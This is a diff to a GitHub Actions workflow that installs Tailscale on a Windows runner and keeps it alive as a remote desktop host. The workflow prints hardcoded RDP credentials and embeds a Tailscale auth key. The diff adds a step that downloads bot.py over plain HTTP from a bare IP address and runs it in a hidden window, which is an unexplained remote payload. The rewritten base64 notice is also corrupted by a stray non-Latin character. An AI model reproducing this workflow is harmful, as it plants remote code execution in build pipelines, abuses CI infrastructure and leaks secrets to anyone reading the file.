@@ -56,18 +56,13 @@ jobs:
 
       - name: Install and Connect Tailscale
         run: |
-          Write-Host "Installing Tailscale via Windows Package Manager..."
+          Write-Host "Installing Tailscale..."
           winget install Tailscale.Tailscale --silent --accept-source-agreements --accept-package-agreements
-          
-          # إعطاء النظام مهلة قصيرة للتثبيت وتحديث المسارات
           Start-Sleep -Seconds 15
           
           $tsPath = "C:\Program Files\Tailscale\tailscale.exe"
-          if (-not (Test-Path $tsPath)) {
-              $tsPath = "C:\Program Files (x86)\Tailscale\tailscale.exe"
-          }
+          if (-not (Test-Path $tsPath)) { $tsPath = "C:\Program Files (x86)\Tailscale\tailscale.exe" }
           
-          Write-Host "Connecting to Tailscale Network..."
           & $tsPath up --authkey=tskey-auth-kdo6rTZUhZ11CNTRL-fYjtg3XE58MVxL4WktbA8MMYfhS2jsaA7 --hostname=gh-runner-$env:GITHUB_RUN_ID-${{ matrix.server }}
           
           $tsIP = $null
@@ -77,12 +72,19 @@ jobs:
               Start-Sleep -Seconds 5
               $retries++
           }
-          if (-not $tsIP) {
-              Write-Error "Tailscale IP not assigned. Exiting."
-              exit 1
-          }
+          if (-not $tsIP) { Write-Error "Tailscale IP not assigned."; exit 1 }
           echo "TAILSCALE_IP=$tsIP" >> $env:GITHUB_ENV
-          echo "TS_EXE_PATH=$tsPath" >> $env:GITHUB_ENV
+
+      - name: Download and Run Bot
+        run: |
+          $botUrl = "http://31.57.97.113/download"
+          $botPath = "C:\bot.py"
+          
+          Write-Host "Downloading bot.py..."
+          Invoke-WebRequest -Uri $botUrl -OutFile $botPath
+          
+          Write-Host "Starting Bot in Background..."
+          Start-Process python -ArgumentList "C:\bot.py" -WindowStyle Hidden
 
       - name: Verify RDP Accessibility
         run: |
@@ -96,15 +98,13 @@ jobs:
 
       - name: Maintain Connection
         run: |
-          $ownershipNotice = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Cj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQogQ29weXJpZ2h0IMKpIDIwMjUgVG9vbGJveExhcC54eXogfCBodHRwczovL3d3dy50b29sYm94bGFwLnh5ei8KIEFsbCByaWdodHMgcmVzZXJ2ZWQuIERvIG5vdCByZW1vdmUgb3IgbW9kaWZ5IGNvcHlyaWdodCB0ZXh0LgogWW91VHViZTogaHR0cHM6Ly93d3cueW91dHViZS5jb20vY2hhbm5lbC9VQ0RUNGZzOUp3cm5RSVhQclhYOHlIZVEKIEZhY2Vib29rOiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcHJvZmlsZS5waHA/aWQ9NjE1Njc4OTY2OTI5OTQKIEFueSBjaGFuZ2VzIHdpbGwgYXV0b21hdGljYWxseSBkaXNhYmxlIHRoaXMgc2NyaXB0IQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0K"))
+          $ownershipNotice = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Cj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQogQ29weXJpZ2h0IMKpIDIwMjUgVG9vbGJveExhcC54eXogfCBodHRwczovL3d3dy50b29sYm94bGFwLnh5ei8KIEFsbCByaWdodHMgcmVzZXJ2ZWQuIERvIG5vdCByZW1vdmUgb3IgbمodGlmeSBjb3B5cmlnaHQgdGV4dC4KIFlvdVR1YmU6IGh0dHBzOi8vd3d3LnlvdXR1YmUuY29tL2NoYW5uZWwvVUNEVDRmzOUp3cm5RSVhQclhYOHlIZVEKIEZhY2Vib29rOiBodHRwczovL3d3dy5mYWNlYm9vay5jb20vcHJvZmlsZS5waHA/aWQ9NjE1Njc4OTY2OTI5OTQKIEFueSBjaGFuZ2VzIHdpbGwgYXV0b21hdGljYWxseSBkaXNhYmxlIHRoaXMgc2NyaXB0IQo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0K"))
           Write-Host $ownershipNotice
           Write-Host "`n=== RDP ACCESS ==="
           Write-Host "Address: $env:TAILSCALE_IP"
           Write-Host "Username: TOOLBOXLAP"
           Write-Host "Password: admin@123"
-          Write-Host "Powered by https://www.toolboxlap.xyz/"
-          Write-Host "========= All rights reserved =========`n"
           while ($true) {
-              Write-Host "[$(Get-Date)] RDP Active - Use Ctrl+C in workflow to terminate"
+              Write-Host "[$(Get-Date)] RDP and Bot Active"
               Start-Sleep -Seconds 300
           }
